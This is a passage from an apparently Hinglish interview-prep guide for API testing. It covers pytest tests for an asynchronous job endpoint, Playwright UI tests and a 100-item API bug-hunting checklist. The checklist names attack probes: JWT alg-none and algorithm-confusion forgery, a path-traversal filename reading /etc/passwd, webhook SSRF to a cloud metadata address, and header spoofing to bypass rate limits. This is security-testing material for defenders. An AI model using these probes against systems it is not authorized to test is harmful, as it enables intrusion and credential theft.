         Fast machine pe timing badal jaati hai, CI slow ho to fail.
      2. EXPONENTIAL BACKOFF — 1s, 1.5s, 2.25s... capped.
         Fixed 100ms polling server ko hammer karta hai.
      3. Retry-After honour karo agar server bheje.
      4. Terminal FAILURE pe TURANT ruko — timeout tak poll mat karo.
         Warna 2-second failure 120-second test ban jaata hai.
      5. Failure message mein poora job payload — debugging ke liye.
    """
    deadline = time.time() + timeout
    interval = initial_interval
    last = None
    polls = 0

    while time.time() < deadline:
        r = api.get(status_url, expected_status=200)
        last = r.json()
        polls += 1
        status = last["status"]

        if status == expected_terminal:
            elapsed = timeout - (deadline - time.time())
            log.info("Job reached %s after %.1fs (%d polls)", status, elapsed, polls)
            return last

        if status in ("FAILED", "CANCELLED", "ERROR", "TIMED_OUT"):
            raise AssertionError(
                f"Job reached terminal state '{status}', expected '{expected_terminal}'\n"
                f"Full payload: {json.dumps(last, indent=2)}"
            )

        server_hint = r.headers.get("Retry-After")
        sleep_for = float(server_hint) if server_hint and server_hint.isdigit() else interval
        time.sleep(min(sleep_for, max(0, deadline - time.time())))
        interval = min(interval * 1.5, max_interval)

    raise JobTimeout(
        f"Job did not reach '{expected_terminal}' within {timeout}s "
        f"after {polls} polls.\nLast state: {json.dumps(last, indent=2)}"
    )
```

### Test suite

```python
class TestAsyncConvertToOffer:
    """[REAL endpoint] POST /api/v1/budgets/{id}/convert-to-offer"""

    # ---------- submit ----------
    def test_submit_returns_202_with_tracking(self, api, budget_id):
        """202 ka contract: kaam ACCEPT hua, HUA nahi.
        Client ko track karne ka rasta milna chahiye — warna 202 useless hai."""
        r = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")

        assert r.status_code == 202, f"Expected 202, got {r.status_code}"
        body = r.json()

        status_url = r.headers.get("Location") or body.get("statusUrl")
        assert status_url, (
            "202 without a Location header or statusUrl — "
            "client has no way to discover the outcome"
        )
        assert body["status"] in ("QUEUED", "PENDING", "ACCEPTED")
        assert body.get("jobId")

        # Status URL turant reachable honi chahiye — race nahi honi chahiye
        immediate = api.get(status_url)
        assert immediate.status_code == 200, (
            f"Status URL returned {immediate.status_code} immediately after 202 — "
            "job record is created asynchronously, so clients hit a 404 race"
        )

    # ---------- happy path ----------
    def test_job_completes_and_produces_result(self, api, budget_id):
        submit = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")
        status_url = submit.headers["Location"]

        job = wait_for_job(api, status_url, timeout=120)

        assert job["status"] == "COMPLETED"
        assert job.get("resultUrl"), "COMPLETED job with no resultUrl"

        # SIDE EFFECT verify karo — job COMPLETED kehna kaafi nahi
        offer = api.get(job["resultUrl"], expected_status=200).json()
        assert offer["budgetId"] == budget_id
        assert offer["totalPrice"] is not None, \
            "[REAL bug class] offer created but price is null"
        assert offer["lineItems"], "offer created with no line items"

        # Aur source entity ka state bhi badla hona chahiye
        budget = api.get(f"/api/v1/budgets/{budget_id}").json()
        assert budget["status"] == "CONVERTED"

    # ---------- failure path ----------
    def test_failure_is_reported_not_silently_dropped(self, api, locked_budget_id):
        """Async ka sabse bada risk: kaam CHUPCHAP fail ho jaata hai.
        202 mila, client khush, kuch hua hi nahi.
        Failure EXPLICIT honi chahiye aur job record mein visible."""
        submit = api.post(f"/api/v1/budgets/{locked_budget_id}/convert-to-offer")
        assert submit.status_code == 202

        status_url = submit.headers["Location"]
        with pytest.raises(AssertionError, match="FAILED"):
            wait_for_job(api, status_url, timeout=60)

        job = api.get(status_url).json()
        assert job["status"] == "FAILED"
        assert job.get("error", {}).get("code"), \
            "FAILED job with no machine-readable error code — client cannot handle it"
        # Aur error message internals leak na kare
        assert "Exception" not in json.dumps(job)
        assert "$java" not in json.dumps(job).lower()

    def test_failed_job_leaves_no_partial_state(self, api, locked_budget_id):
        """Sabse important async correctness test:
        agar job beech mein fail hui, ADHURA data nahi bachna chahiye.
        Async processing multi-step hoti hai — step 3 pe fail hone pe
        steps 1-2 ka kaam rollback ya compensate hona chahiye."""
        before = api.get(f"/api/v1/budgets/{locked_budget_id}").json()

        submit = api.post(f"/api/v1/budgets/{locked_budget_id}/convert-to-offer")
        with contextlib.suppress(AssertionError):
            wait_for_job(api, submit.headers["Location"], timeout=60)

        after = api.get(f"/api/v1/budgets/{locked_budget_id}").json()
        assert after["status"] == before["status"], (
            f"Failed job left budget in '{after['status']}' — partial state. "
            "No rollback or compensating action."
        )
        offers = api.get(f"/api/v1/budgets/{locked_budget_id}/offers").json()["items"]
        assert not offers, "Failed conversion still created an offer record"

    # ---------- duplicate submission ----------
    def test_duplicate_submission_does_not_create_two_jobs(self, api, budget_id):
        """Impatient user "Convert" do baar dabata hai.
        Do offers nahi banne chahiye."""
        r1 = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")
        r2 = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")

        assert r1.status_code == 202
        assert r2.status_code in (202, 409), f"Second submit: {r2.status_code}"

        if r2.status_code == 202:
            assert r2.json()["jobId"] == r1.json()["jobId"], (
                "Two distinct jobs created for the same budget"
            )

        wait_for_job(api, r1.headers["Location"], timeout=120)
        offers = api.get(f"/api/v1/budgets/{budget_id}/offers").json()["items"]
        assert len(offers) == 1, f"{len(offers)} offers created from duplicate submissions"

    def test_concurrent_submissions_produce_one_job(self, api, budget_id):
        """Duplicate ka concurrency version — race window widen karke."""
        def submit():
            return api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer",
                            raise_on_status=False)

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            responses = [f.result() for f in [ex.submit(submit) for _ in range(5)]]

        job_ids = {r.json().get("jobId") for r in responses if r.status_code == 202}
        assert len(job_ids) <= 1, f"{len(job_ids)} distinct jobs from concurrent submits"

    # ---------- polling contract ----------
    def test_status_endpoint_is_stable_and_monotonic(self, api, budget_id):
        """Status ULTA nahi jaana chahiye: COMPLETED ke baad PROCESSING nahi.
        Ye tab hota hai jab multiple workers same job update karte hain
        bina ordering ke — ek stale worker newer state overwrite kar deta hai."""
        submit = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")
        status_url = submit.headers["Location"]

        ORDER = {"QUEUED": 0, "PENDING": 0, "PROCESSING": 1,
                 "COMPLETED": 2, "FAILED": 2, "CANCELLED": 2}
        seen, deadline = [], time.time() + 120

        while time.time() < deadline:
            s = api.get(status_url).json()["status"]
            if not seen or seen[-1] != s:
                seen.append(s)
                assert ORDER[s] >= ORDER[seen[-2]] if len(seen) > 1 else True, \
                    f"Status went backwards: {seen}"
            if ORDER[s] == 2:
                break
            time.sleep(1)

        print(f"State transitions: {' -> '.join(seen)}")

    def test_polling_after_completion_stays_stable(self, api, completed_job_url):
        """Terminal state ke baad status BADALNA nahi chahiye,
        aur job record TTL se pehle gayab nahi hona chahiye."""
        first = api.get(completed_job_url).json()
        time.sleep(5)
        second = api.get(completed_job_url).json()
        assert first["status"] == second["status"] == "COMPLETED"
        assert first.get("resultUrl") == second.get("resultUrl")

    def test_unknown_job_id_returns_404(self, api):
        r = api.get("/api/v1/jobs/job_does_not_exist", raise_on_status=False)
        assert r.status_code == 404
        assert r.status_code != 500

    # ---------- timeout / stuck ----------
    @pytest.mark.slow
    def test_stuck_job_is_eventually_marked_failed(self, api, will_hang_budget_id):
        """Job forever PROCESSING mein nahi rehni chahiye.
        Server-side timeout hona chahiye jo use FAILED mark kare —
        warna client hamesha poll karta rahega."""
        submit = api.post(f"/api/v1/budgets/{will_hang_budget_id}/convert-to-offer")
        status_url = submit.headers["Location"]

        deadline = time.time() + 900
        while time.time() < deadline:
            job = api.get(status_url).json()
            if job["status"] in ("FAILED", "TIMED_OUT"):
                return
            time.sleep(15)
        pytest.fail("Job stuck in non-terminal state for 15 minutes — no server-side timeout")

    # ---------- webhook alternative ----------
    def test_completion_webhook_fires(self, api, webhook_receiver, budget_id):
        """Agar polling ke saath webhook bhi hai, dono consistent hone chahiye."""
        api.post("/api/v1/webhooks", json={"url": webhook_receiver.url,
                                           "events": ["offer.created"],
                                           "secret": "whsec_test"})
        submit = api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")
        job = wait_for_job(api, submit.headers["Location"], timeout=120)

        hook = webhook_receiver.wait_for(
            timeout=60, predicate=lambda h: h["body"]["type"] == "offer.created")
        assert hook["body"]["data"]["offerId"] in job["resultUrl"], \
            "Webhook and polling report different results"
```

### Anti-patterns — ye MAT karo

```python
# ❌ ANTI-PATTERN 1: bare sleep
def test_bad_sleep(api, budget_id):
    api.post(f"/api/v1/budgets/{budget_id}/convert-to-offer")
    time.sleep(10)                      # kyun 10? kisne decide kiya?
    offers = api.get(f"/api/v1/budgets/{budget_id}/offers").json()
    assert offers["items"]
    # Problems: fast machine pe waste, slow CI pe flaky,
    #           aur agar job 11s leti hai to test randomly fail hoga

# ❌ ANTI-PATTERN 2: tight polling loop
while api.get(url).json()["status"] != "COMPLETED":
    pass                                # server ko hammer kar raha hai, no timeout

# ❌ ANTI-PATTERN 3: sirf job status check karna
job = wait_for_job(api, url)
assert job["status"] == "COMPLETED"     # bas? result verify nahi kiya?
# Job COMPLETED bol sakti hai aur result null/empty ho sakta hai

# ❌ ANTI-PATTERN 4: failure pe timeout tak poll karna
# FAILED ek terminal state hai — turant ruko, 2 minute mat waste karo
```

> **Interview answer:**
>
> "A 202 means the request was accepted, not that the work happened — so the whole testing
> problem shifts from 'what came back' to 'what eventually became true, and how do I know'.
>
> The submit step has its own contract that I test first: 202 must carry a way to track the
> work, either a `Location` header or a status URL in the body, plus a job id. And I check that
> the status URL is reachable immediately, because a common bug is that the job record is
> written asynchronously too, so clients that poll straight away hit a 404 race.
>
> Then the polling helper, which I'd write once as framework code rather than per test. Four
> design points I'd defend. It polls with exponential backoff rather than a fixed interval, so
> it's not hammering the server. It honours `Retry-After` if the server sends one. It stops
> immediately on any terminal failure state instead of polling until timeout, because otherwise
> a two-second failure becomes a two-minute test. And on timeout it raises with the full last
> job payload, because 'job did not complete' with no state is unusable in CI. What I'd never
> write is a bare sleep followed by one check — that's the single most common source of flaky
> async tests, since it encodes a timing assumption that differs between a developer laptop and
> a loaded CI runner.
>
> On assertions: a job reporting COMPLETED is not the assertion. I follow the result URL and
> verify the actual artefact — and here I'd specifically check for the bug class I hit at
> Merlin, where an endpoint returned a null total price with an empty line items array. A job
> can complete successfully and produce an empty result. I also verify the source entity's
> state changed, because that's the other half of the side effect.
>
> The failure paths are where async systems really differ. First, failure must be reported, not
> silently dropped — the worst async bug is a 202 followed by nothing, where the client believes
> it succeeded. Second, a failed job must not leave partial state; async work is multi-step, so
> failing at step three should roll back or compensate steps one and two, and I assert the
> source entity is unchanged and no orphan result exists. Third, a job must never be stuck in a
> non-terminal state forever — there has to be a server-side timeout that moves it to FAILED.
> Fourth, duplicate submission: an impatient user double-clicks, and I assert one job and one
> resulting offer, then repeat it with a thread pool to widen the race window.
>
> And one subtle one — status must be monotonic. It should never go from COMPLETED back to
> PROCESSING. That happens when multiple workers update the same job without ordering and a
> stale write overwrites newer state, and it's the same class of problem as out-of-order
> webhook delivery."

> **Cross-question: "The job takes forty minutes. How do you test that in CI?"**
>
> "I'd split it by what I'm actually trying to learn. The contract around the job — submit
> returns 202 with tracking, status transitions are monotonic, failure is reported, duplicates
> are rejected, unknown ids give 404 — doesn't require a forty-minute job, so I'd test that
> against a small input that completes in seconds, and that suite runs on every pull request.
> The genuine long-running case is a nightly test, not a PR gate, because a forty-minute job in
> a pull request pipeline is a blocker that people will disable.
>
> Beyond that I'd push for testability rather than accept the constraint. A test-profile flag
> that shrinks the work, or the ability to inject a job into a specific state so I can test
> transitions directly, turns a forty-minute test into a five-second one. That's a reasonable
> ask, and I'd frame it in terms of what it buys the team — right now nobody can verify failure
> handling on that path without spending forty minutes, so in practice nobody verifies it."

---

## Q10. "How do you decide what to test at API level vs UI level?"

### Decision framework — pehle ye principle bolo

```
RULE: Test har cheez ko us layer pe jahan wo DECIDE hoti hai.

Business rule backend mein decide hoti hai      -> API test
Rendering/interaction browser mein hoti hai      -> UI test
Dono ko jodne wala wiring                        -> ek E2E test, kai nahi
```

### Layer assignment table

| Kya test karna hai | Kahan | Kyun |
|---|---|---|
| Business rules (over-budget, duplicate scope, state machine) | **API** | Logic backend mein hai. UI pe test karna 10x slow aur flaky |
| Validation (field types, boundaries, required) | **API** (exhaustive) + **UI** (1-2 samples) | API pe 50 cases parametrized; UI pe sirf "error dikhta hai kya" |
| Authorization (roles, tenant isolation) | **API** | UI button hide kar sakta hai lekin endpoint khula ho sakta hai — **ye asli test hai** |
| Auth mechanics (token expiry, forgery, refresh) | **API** | UI se JWT tamper karna possible hi nahi |
| Concurrency / race conditions | **API only** | UI se 25 parallel requests nahi bhej sakte |
| Idempotency, retry safety | **API only** | UI ye scenario produce nahi kar sakta |
| Error responses, status codes, headers | **API** | UI unhe hide kar deta hai |
| Data calculations (totals, percentages) | **API** | Source of truth backend hai |
| Pagination correctness (no gaps/duplicates) | **API** | Sab pages walk karna UI pe impractical |
| Performance / latency | **API** | UI timing browser render se polluted hoti hai |
| **Rendering** — sahi value sahi jagah dikhi | **UI** | Sirf browser hi bata sakta hai |
| **Formatting** — 2,50,000 vs 250000, date format, currency symbol | **UI** | Ye presentation layer ka kaam hai |
| **Interaction** — click, form fill, drag, keyboard nav | **UI** | Browser-only |
| **Conditional rendering** — button disable, error message dikhna | **UI** | Frontend logic |
| **Responsive / cross-browser** | **UI** | Browser-only |
| **Accessibility** — labels, roles, contrast, focus order | **UI** | Browser-only |
| **Critical happy path wiring** (login → carve → see it) | **UI, 1 test** | Confirms the stack is connected |

### The pyramid — with numbers

```
        /\
       /  \       E2E (UI):  5-10 tests
      /    \      Sirf critical revenue paths, ek-ek baar
     /------\     Slow, brittle, expensive to maintain
    /        \
   /          \   API:  200-500 tests
  /            \  Business rules, auth matrix, validation,
 /              \ concurrency, idempotency, schema, security
/________________\ FAST, STABLE, PRECISE FAILURES
     Unit: 1000+  (dev-owned)
```

### Ek concrete worked example — "carve budget" feature

```python
# ---------- API LAYER (approx 95 tests — Part 7 se) ----------
# functional, 50 validation cases, role matrix, business rules,
# idempotency, concurrency, schema, security

# ---------- UI LAYER (approx 6 tests) ----------

def test_ui_happy_path_carve(page):
    """1 E2E test — poora stack wired hai ye confirm karta hai."""
    login_via_ui(page)
    page.goto("/budgets/b_1")
    page.get_by_role("button", name="Carve Scope").click()
    page.get_by_label("Scope").select_option("Civil")
    page.get_by_label("Amount").fill("250000")
    page.get_by_role("button", name="Confirm").click()
    expect(page.get_by_role("alert")).to_contain_text("Carve created")
    expect(page.get_by_role("row", name="Civil")).to_contain_text("₹2,50,000")


def test_ui_shows_validation_error(page, api_admin):
    """UI-specific: error MESSAGE DIKHTA hai kya, sahi field ke paas.
    Ye API test nahi kar sakta. Lekin main 50 validation cases yahan nahi doharaunga —
    sirf ek, ye verify karne ke liye ki error rendering wired hai."""
    page.goto("/budgets/b_1")
    page.get_by_role("button", name="Carve Scope").click()
    page.get_by_label("Amount").fill("-100")
    page.get_by_role("button", name="Confirm").click()
    expect(page.get_by_text("Amount must be greater than zero")).to_be_visible()


def test_ui_hides_carve_button_for_viewer(page):
    """UI-specific: conditional rendering.
    NOTE: ye SECURITY test NAHI hai — ye UX test hai.
    Security wala test API pe hai (VIEWER ko 403 milta hai)."""
    login_via_ui(page, role="VIEWER")
    page.goto("/budgets/b_1")
    expect(page.get_by_role("button", name="Carve Scope")).not_to_be_visible()


def test_ui_formats_indian_currency(page, api_admin):
    """UI-specific: 250000 -> ₹2,50,000 (lakh grouping, not thousand grouping).
    API integer deta hai; formatting frontend ka kaam hai."""
    api_admin.post("/api/v1/budgets/b_1/carve",
                   json={"scopeId": "sc_civil", "amount": 25000000, "currency": "INR"})
    page.goto("/budgets/b_1")
    expect(page.get_by_test_id("carve-sc_civil")).to_have_text("₹2,50,00,000")


def test_ui_handles_api_error_gracefully(page):
    """UI-specific: backend 500 dene pe kya dikhta hai.
    Route interception se simulate — API test ye kabhi nahi kar sakta."""
    page.route("**/api/v1/budgets/*/carve", lambda r: r.fulfill(
        status=500, body='{"code":"INTERNAL_ERROR"}'))
    page.goto("/budgets/b_1")
    page.get_by_role("button", name="Carve Scope").click()
    page.get_by_label("Amount").fill("250000")
    page.get_by_role("button", name="Confirm").click()
    expect(page.get_by_role("alert")).to_contain_text("Something went wrong")
    expect(page.get_by_role("button", name="Retry")).to_be_visible()


def test_ui_shows_loading_state(page):
    def slow(route):
        time.sleep(2); route.continue_()
    page.route("**/api/v1/budgets/*/coverage", slow)
    page.goto("/budgets/b_1")
    expect(page.get_by_test_id("coverage-skeleton")).to_be_visible()
```

**95 API tests, 6 UI tests.** Aur wo 6 tests wo cheezein test karte hain jo **sirf** UI test
kar sakta hai.

### Hybrid pattern — dono ka best

```python
def test_carve_appears_in_ui(page, api_admin):
    """Setup API se (200ms), verify UI se (real user view).
    Ye pattern UI suite ko 5-10x fast bana deta hai —
    kyunki setup ke 20 clicks nahi karne padte, aur setup steps flaky nahi hote."""
    budget = api_admin.post("/api/v1/budgets", json={...}).json()
    api_admin.post(f"/api/v1/budgets/{budget['id']}/carve",
                   json={"scopeId": "sc_civil", "amount": 250000, "currency": "INR"})

    page.goto(f"/budgets/{budget['id']}")
    expect(page.get_by_test_id("coverage-percent")).to_have_text("2.5%")
```

> **Interview answer:**
>
> "My rule is to test each thing at the layer where it's actually decided, and to treat every
> UI test as expensive — because it is: slower, flakier, and when it fails it tells you
> something in a long chain broke rather than what.
>
> Business rules are decided in the backend, so they belong at the API level. Over-budget
> rejection, duplicate scope conflicts, the sale state machine — all API. Validation gets
> tested exhaustively at API level, fifty parametrised cases, and once at UI level just to
> confirm error rendering is wired up. Authorization is API, and I'd stress that one: a UI test
> proving the button is hidden for a viewer is a UX test, not a security test. Hiding a button
> doesn't close an endpoint, and the endpoint is what an attacker calls. Both are worth having,
> but only one of them is security.
>
> Then there's a set of things the UI physically cannot test. I can't forge a JWT through a
> browser. I can't fire twenty-five simultaneous carves at one scope from a UI. I can't
> simulate a timeout followed by a retry with the same idempotency key. Those are API-only, and
> they're where the highest-value tests live.
>
> The UI owns what only a browser can answer: that the right value is rendered in the right
> place, formatting — and Indian currency grouping is a real example, since the API returns an
> integer and turning it into ₹2,50,00,000 with lakh grouping is purely frontend — interaction,
> conditional rendering, responsiveness, and accessibility. Plus error and loading states, which
> I test by intercepting the network with Playwright's route fulfilment, because I can't ask
> the backend to fail on command.
>
> Concretely, for our carve feature that's roughly ninety-five API tests and about six UI
> tests, and those six test things nothing else can. I'd also use the hybrid pattern heavily —
> seed data through the API in a couple of hundred milliseconds, then verify rendering through
> the UI. That typically makes a UI suite several times faster and much less flaky, because
> most UI flakiness comes from the setup clicks, not from the assertion."

> **Cross-question: "Your product owner says 'the user doesn't use the API, so UI tests are what matter'. How do you respond?"**
>
> "I'd agree with the premise and disagree with the conclusion, and I'd argue it in terms of
> risk rather than preference. The user experiences the UI, but the defects mostly aren't in
> the UI. The three most serious bugs I found at Merlin were an information disclosure on a
> public endpoint that returned a raw Mongo query in an error message, a customer-facing
> endpoint returning a null price for a contract with a real value, and a broken end-to-end
> flow that fifty-seven backend tests missed. Not one of those is reachable from a browser —
> the first two are error and data paths the UI never triggers, and the third is a seam between
> services.
>
> The other half is economics. If I test one business rule through the UI, it costs maybe
> thirty seconds and it's flaky. Through the API it costs two hundred milliseconds and it's
> deterministic. For the same time budget I get roughly a hundred times the coverage. So the
> honest framing isn't API tests versus UI tests — it's that testing everything through the UI
> means testing far less overall, and the parts you drop are the parts most likely to hurt a
> customer. I'd keep the critical user journeys as UI tests, because they genuinely prove the
> stack is connected, and put the depth where it's cheap."

---

# PART 13 — Common API Bugs: hunting checklist

Ye wo list hai jo main **har naye endpoint pe** mentally run karta hoon. Interview mein isme
se 8-10 bol dena aapko systematic dikhata hai.

## 13.1 Data correctness

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 1 | **200 with null/empty data** | Null-safety walk + allowlist | `totalPrice: null`, `items: []` jahan data hona chahiye — **[REAL]** |
| 2 | Sum of parts ≠ whole | Arithmetic invariant assertions | `sum(lineItems) != totalPrice` |
| 3 | Percentage doesn't match ratio | Recompute and compare | `coveragePercent` vs `carved/total` |
| 4 | Money as float | Grep raw JSON for `\d+\.\d+` in money fields | `4500000.5` |
| 5 | Precision lost on round-trip | Create with known value, read back | `123456789` → `123456700` |
| 6 | Timestamps without timezone | Assert `Z` or `+HH:MM` suffix | `"2026-08-23T10:00:00"` → IST mein 5.5h error |
| 7 | `updatedAt` before `createdAt` | Ordering assertion | Clock skew / bad default |
| 8 | Unicode/emoji mangled | Round-trip with `अनुबंध 🏗️` | `????` ya `अ...` |
| 9 | Stale data after write | Write then immediately read | Read replica lag / cache not invalidated |
| 10 | Aggregation excludes/includes wrong rows | Compare list total vs aggregate | Soft-deleted records in totals |

## 13.2 Validation

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 11 | **500 on malformed input** | Fuzz table: trailing comma, unclosed brace, NaN, empty | Any 5xx = missing validation |
| 12 | Type coercion accepted | Send `"250000"` where int expected | 201 instead of 400 |
| 13 | No boundary check | Test 0, 1, limit, limit+1, negative, 2^63 | Off-by-one at exactly the limit |
| 14 | No max length on strings | Send 100,000 chars | 201, or timeout, or 500 |
| 15 | Fail-fast validation | Send 3 bad fields | Only 1 error returned |
| 16 | No field pointer in error | Check error body for `field`/`path` | Frontend can't show inline errors |
| 17 | Unknown fields silently accepted | Send `{"orgId": "other"}` | Mass assignment risk |
| 18 | Typo'd filter param ignored | `?staus=OPEN` instead of `?status=` | Full dataset returned, looks filtered |
| 19 | Invalid enum value returns everything | `?status=NONSENSE` | 200 with all records |
| 20 | Duplicate JSON keys | `{"amount":100,"amount":999999}` | Parser inconsistency between layers |

## 13.3 Auth & authorization

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 21 | **Endpoint accidentally public** | Remove Authorization header on every route | 200 instead of 401 |
| 22 | **IDOR** — no object-level check | Same role, different owner's resource | 200 instead of 403/404 |
| 23 | **Cross-tenant access** | Other-org user hits your resource | 200 = broken isolation; 403 = existence leak |
| 24 | Org scoping overridable | `X-Org-Id` header / `orgId` in body / query | Server honours client-supplied tenant |
| 25 | 403 where 404 is correct | Cross-tenant resource | Existence oracle |
| 26 | Timing oracle | Median timing: cross-org vs nonexistent | >1.5x ratio |
| 27 | `alg: none` accepted | Forge token with no signature | 200 = complete auth bypass |
| 28 | Algorithm confusion RS256→HS256 | Sign with public key as HMAC secret | 200 = privilege escalation |
| 29 | Expiry not enforced | Token with `exp` in the past | 200 |
| 30 | `aud`/`iss` not validated | Dev-env token against staging | 200 = shared secrets across envs |
| 31 | 500 in auth filter | Malformed `Authorization` header values | Unauthenticated code path crashing |
| 32 | Logout doesn't revoke | Use refresh token after logout | 200 |
| 33 | Refresh token not rotated | Refresh twice, reuse the first | Old token still works |
| 34 | 401 returned for permission errors | Viewer attempts admin action | Client infinite refresh loop |
| 35 | Cookie missing HttpOnly/Secure/SameSite | Parse `Set-Cookie` | XSS/CSRF exposure |
| 36 | Session id not regenerated on login | Compare pre/post-login cookie | Session fixation |

## 13.4 Information disclosure

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 37 | **Raw query / ORM internals in error** | Fuzz a public endpoint, grep response | `$java`, `LazyLoadingProxy`, `ObjectId(` — **[REAL]** |
| 38 | Stack trace in error body | Trigger 500, grep for `at com.`, `Caused by` | Framework/version disclosure |
| 39 | HTML error page leaks trace | Send `Accept: text/html` on an error path | Spring default error page |
| 40 | Internal fields in response | `additionalProperties: false` + denylist | `_class`, `costPrice`, `internalMargin` |
| 41 | Server version headers | Check `Server`, `X-Powered-By` | Exact CVE targeting |
| 42 | Secrets in JWT payload | Decode payload, scan keys | Password hash, API key |
| 43 | Secrets in query string | Inspect request URLs | `?token=`, `?api_key=` in logs |
| 44 | User enumeration on login/reset | Compare responses + timing for real vs fake email | Different message or latency |
| 45 | Verbose 404 vs 403 distinction | Compare bodies byte-for-byte | Distinguishable = oracle |

## 13.5 Concurrency & idempotency

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 46 | **Duplicate creation on double-submit** | Two identical POSTs | 2× 201 instead of 201+409 |
| 47 | **Race condition** — check-then-act | ThreadPoolExecutor, 2→25 concurrent | Multiple winners |
| 48 | Over-limit via concurrency | N concurrent requests summing past the budget | Total exceeds cap — **money bug** |
| 49 | Raw DB exception on constraint violation | Trigger duplicate | 500 instead of 409 |
| 50 | Lock too coarse | Concurrent ops on *different* keys | All but one get 409 |
| 51 | Idempotency key ignored | Same key twice | Two distinct resources |
| 52 | Same key, different payload accepted | Reuse key with new body | Cached response returned silently |
| 53 | Idempotency key not user-scoped | User B reuses User A's key | A's response leaked to B |
| 54 | Timeout + retry duplicates | Force client timeout, retry | Two records |
| 55 | Lost update (no optimistic locking) | Two PATCHes from same ETag | Second silently overwrites |

## 13.6 Method & protocol semantics

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 56 | State-changing action on GET | `GET /sales/{id}/close` | 200 = CSRF/prefetch vector |
| 57 | PUT behaves like PATCH | PUT with partial body, read back | Unmentioned fields preserved |
| 58 | PATCH drops unmentioned fields | PATCH one field, read back | Other fields nulled — **data loss** |
| 59 | Explicit `null` doesn't clear field | PATCH `{"notes": null}` | Field unchanged |
| 60 | DELETE not idempotent | DELETE twice | 500 on second call |
| 61 | Soft-deleted record still in some paths | Delete, then check list/search/export/aggregate | Present in one path |
| 62 | 201 without `Location` | Create a resource | Missing header |
| 63 | 204 with a body | Check `Content-Length` | Clients crash |
| 64 | 304 with a body | Conditional GET | Bandwidth wasted |
| 65 | OPTIONS requires auth | Preflight without credentials | 401 = all browser calls fail |
| 66 | TRACE enabled | `TRACE /` | XST — HttpOnly bypass |
| 67 | `Content-Type` not enforced | JSON body with `text/plain` | 201 = CSRF preflight bypass |

## 13.7 Pagination, filtering, sorting

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 68 | **Off-by-one** — first/last record missing | Walk all pages, compare with full list | `page=1` skips record 1 |
| 69 | Duplicates across pages | Collect all ids, check uniqueness | Non-deterministic sort |
| 70 | `total` counted before filtering | Filter + compare total vs item count | "20 of 500" when there are 20 |
| 71 | No max on `pageSize` | `?pageSize=10000` | Memory/DoS |
| 72 | No deterministic tiebreaker | Fetch same page 5× | Different order each time |
| 73 | Sort on arbitrary/internal field | `?sort=costPrice` | Value inference + full scan DoS |
| 74 | Deep offset performance cliff | Time page 1 vs page 500 | 50× slower |
| 75 | Cursor tamperable | Edit cursor, resend | Cross-tenant data or 500 |
| 76 | Page beyond end errors | `?page=99999` | 404 or 500 instead of empty 200 |

## 13.8 Performance & caching

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 77 | **N+1 queries** | Per-record cost constant across page sizes | Time ∝ record count |
| 78 | No response compression | Check `Content-Encoding` | Large uncompressed payloads |
| 79 | Sensitive data cacheable | Check `Cache-Control` on user data | `public` or missing `no-store` |
| 80 | Cacheable response without `Vary: Authorization` | Check `Vary` header | **Shared cache serves A's data to B** |
| 81 | ETag doesn't change on update | PATCH then compare ETags | Clients serve stale data forever |
| 82 | Missing `Access-Control-Max-Age` | Preflight response | Doubled latency on every call |
| 83 | Response payload unbounded | Request without pagination params | Full table returned |
| 84 | High p99/p50 ratio | Latency profile | GC / pool contention / cold cache |

## 13.9 Rate limiting & abuse

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 85 | **No brute-force protection on login** | 50 wrong passwords | No 429/423 |
| 86 | Rate limit is global, not per-identity | Exhaust user A, try user B | B blocked = DoS vector |
| 87 | Bypassable via `X-Forwarded-For` | Rotate the header per request | Never hits 429 |
| 88 | 429 without `Retry-After` | Trigger rate limit | Clients retry aggressively |
| 89 | Window never resets | Wait `Retry-After`, retry | Still 429 |

## 13.10 Integrations, uploads, webhooks

| # | Bug | Kaise hunt karo | Signal |
|---|---|---|---|
| 90 | Upload validated by extension, not magic bytes | `fake.pdf` containing `MZ` | Accepted |
| 91 | Path traversal in filename | `../../../etc/passwd` | Accepted |
| 92 | Uploaded file served inline | Check `Content-Disposition`/`nosniff` | Stored XSS via SVG/HTML |
| 93 | No upload size limit | 100 MB file | Timeout or 500 instead of 413 |
| 94 | **Webhook URL SSRF** | Register `http://169.254.169.254/` | Cloud credential theft |
| 95 | Webhook without signature | Inspect delivered headers | Anyone can forge events |
| 96 | Signature over reserialized JSON | Compare raw bytes vs `json.dumps` | Verification breaks/bypassable |
| 97 | Replay accepted | Resend a valid event with old timestamp | Accepted |
| 98 | Duplicate event → duplicate side effect | Send same event twice | Two payment rows |
| 99 | Out-of-order events overwrite newer state | Deliver `closed` before `opened` | Final state wrong |
| 100 | Webhook delivery blocks the API | Slow receiver | API request hangs |

## 13.11 The 12 I'd check first on any new endpoint

Agar sirf 15 minute hain, ye karo:

```
 1. No auth header            -> 401?
 2. Wrong role                -> 403?
 3. Other org's resource      -> 404 (not 403)?
 4. Malformed JSON            -> 400, never 500?
 5. Error body                -> any stack trace / query / internal name?
 6. Response body             -> any unexpected null?
 7. Response body             -> any internal field (_class, orgId, costPrice)?
 8. Same request twice        -> 201+409, or two 201s?
 9. Two concurrent requests   -> exactly one winner?
10. GET on a POST endpoint    -> 405?
11. Cache-Control on user data-> no-store / private?
12. Read back what you wrote  -> does it match exactly?
```

---

# PART 14 — Red flags: ye jawab mat dena

Interview mein technically-galat answer se zyada nuksaan **shallow-sounding** answer karta
hai. Ye wo lines hain jo senior candidate ko junior bana deti hain — aur unka replacement.

## 14.1 Status codes aur validation

| ❌ Mat bolo | Kyun bura hai | ✅ Ye bolo |
|---|---|---|
